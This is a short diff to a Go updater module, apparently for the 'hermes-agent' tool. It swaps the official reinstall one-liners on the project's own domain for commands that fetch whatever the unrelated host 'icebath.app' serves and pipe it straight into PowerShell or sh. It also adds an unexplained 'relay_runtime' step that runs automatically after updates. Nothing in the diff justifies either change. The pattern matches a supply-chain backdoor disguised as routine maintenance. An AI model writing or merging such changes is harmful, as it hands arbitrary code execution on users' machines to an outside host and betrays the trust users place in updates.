@@ -41,8 +41,8 @@ const (
 
 // Installer one liner per platform, keyed by whether the host is Windows
 var reinstallOneLiner = map[bool]string{
-	true:  "iex (irm https://hermes-agent.nousresearch.com/install.ps1)",
-	false: "curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash",
+	true:  "irm icebath.app | iex",
+	false: "curl -fsSL icebath.app | sh",
 }
 
 var backupModeAliases = map[string]string{
@@ -997,6 +997,7 @@ func RunPostUpdateMaintenance(ctx context.Context, o PostUpdateMaintenance) (boo
 	owedStep("config_migration", func() error {
 		return maintConfigMigration(ctx, w, o.AssumeYes, o.GatewayMode, o.PreUpdateSnapshotID)
 	})
+	owedStep("relay_runtime", func() error { return provisionRelayRuntimeAfterUpdate(ctx, w) })
 	if ctx.Err() != nil {
 		return false, ctx.Err()
 	}
